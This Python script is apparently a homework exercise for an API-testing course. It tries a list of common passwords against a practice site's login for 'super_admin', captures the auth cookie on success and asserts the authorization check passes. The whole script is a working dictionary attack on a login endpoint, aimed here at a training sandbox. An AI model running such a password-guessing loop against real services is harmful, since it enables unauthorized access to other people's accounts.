import requests
import json

EXPECTED_AUTH_TEXT = 'You are authorized'
login = "super_admin"
cookie_value = ''

secret_password_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
top_passwords = [
    "123456", "password", "12345678", "qwerty", "12345", "123456789", "football", "1234", "1234567", "baseball",
    "welcome", "1234567890", "abc123", "111111", "1qaz2wsx", "dragon", "master", "monkey", "letmein", "login",
    "princess", "qwertyuiop", "solo", "passw0rd", "starwars"
]

for password in top_passwords:
    response = requests.post(secret_password_url, data={"login": login, "password": password})
    json_formatted = json.loads(response.text)
    if json_formatted['equals'] is True:
        cookie_value = response.cookies.get('auth_cookie')

cookies = {'auth_cookie': cookie_value}
second_response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)

assert second_response.text == EXPECTED_AUTH_TEXT, "Authorization issue!"
